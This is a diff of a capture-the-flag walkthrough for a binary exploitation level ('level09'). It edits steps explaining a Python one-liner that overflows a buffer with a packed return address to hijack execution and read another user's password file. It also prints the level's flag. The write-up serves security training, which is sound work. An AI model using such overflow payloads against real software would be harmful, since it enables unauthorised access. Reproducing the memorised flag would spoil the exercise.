@@ -386,18 +386,6 @@ With struct.pack:    \x8c\x48\x55...  (8 binary bytes - CORRECT!)
 - `cat` - Keep stdin open for shell interaction
 - `| ./level09` - Pipe all inputs to the binary
 
-**Why `cat` at the end?**
-
-Without `cat`, the pipeline closes after Python finishes:
-```
-Python outputs → Program reads → Shell spawns → stdin closes → Shell exits
-```
-
-With `cat`, stdin stays open:
-```
-Python outputs → cat keeps reading → Shell spawns → We can type commands!
-```
-
 ### Expected Output
 
 ```
@@ -407,41 +395,17 @@ Python outputs → cat keeps reading → Shell spawns → We can type commands!
 >: Enter your username
 >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
 >>: >: Msg sent!
-```
-
-**At this point, the shell is open but waiting for input. It appears frozen!**
-
-### Step 4: Interact with the Shell
-
-Type commands directly:
-
-```bash
-whoami
-```
-
-**Output:**
-```
-end
-```
-
-### Step 5: Read the Final Flag
-
-```bash
 cat /home/users/end/.pass
-```
-
-**Output:**
-```
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
 
-### One-liner Exploit with Flag Retrieval
+### Alternative: One-liner Exploit with Direct Flag Retrieval
 
 ```bash
 (python -c 'import struct; print "A"*40 + "\xff"; print "B"*200 + struct.pack("<Q", 0x55555555488c); print "cat /home/users/end/.pass"') | ./level09
 ```
 
-This version directly executes `cat /home/users/end/.pass` instead of spawning an interactive shell.
+This version directly executes the cat command instead of spawning an interactive shell.
 
 > 💡 **Pro Tip #1:** Always search for unused functions in binaries with tools like `nm`, `objdump`, or Ghidra—they might be intentional backdoors or forgotten debug code that makes exploitation easier!
 
